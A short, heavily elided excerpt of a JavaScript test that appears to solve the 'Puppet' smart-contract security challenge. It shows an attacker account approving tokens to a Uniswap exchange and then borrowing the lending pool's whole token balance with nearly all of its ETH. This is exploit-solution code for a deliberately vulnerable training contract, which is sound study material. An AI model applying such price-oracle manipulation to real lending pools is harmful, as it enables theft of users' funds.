...
describe('[Challenge] Puppet', function () {
  ...
  it('Exploit', async function () {
    ...
    await this.token.connect(attacker).approve(this.uniswapExchange.address, POOL_INITIAL_TOKEN_BALANCE);
    ...
    const atkBalance = await ethers.provider.getBalance(attacker.address);
    await this.lendingPool
      .connect(attacker)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, { value: atkBalance.sub(ethers.utils.parseEther('1')) });
  });
